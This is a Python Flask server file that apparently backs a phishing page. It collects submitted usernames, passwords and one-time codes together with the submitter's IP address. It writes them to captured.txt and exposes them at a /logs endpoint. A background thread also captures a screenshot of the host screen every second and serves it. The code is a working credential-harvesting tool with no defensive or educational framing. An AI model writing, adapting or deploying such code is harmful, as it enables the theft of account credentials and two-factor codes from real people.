from flask import Flask, render_template, request, jsonify
import threading
import time
import os
from mss import mss
from datetime import datetime

app = Flask(__name__)
os.makedirs('static', exist_ok=True)

# store captured creds
creds_log = []

def screenshot_loop():
    with mss() as sct:
        while True:
            try:
                filename = f"static/screenshot.png"
                sct.shot(output=filename)
                time.sleep(1)
            except:
                pass

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.get_json()
    entry = {
        'user': data.get('username'),
        'pass': data.get('password'),
        'code': data.get('code'),
        'ip': request.remote_addr,
        'time': datetime.now().isoformat()
    }
    creds_log.append(entry)
    with open('captured.txt', 'a') as f:
        f.write(f"{entry}\n")
    return jsonify({'status': 'ok'})

@app.route('/logs')
def logs():
    return jsonify(creds_log)

@app.route('/screenshot')
def screenshot():
    return app.send_static_file('screenshot.png')

if __name__ == '__main__':
    t = threading.Thread(target=screenshot_loop, daemon=True)
    t.start()
    app.run(host='0.0.0.0', port=5000, debug=False)
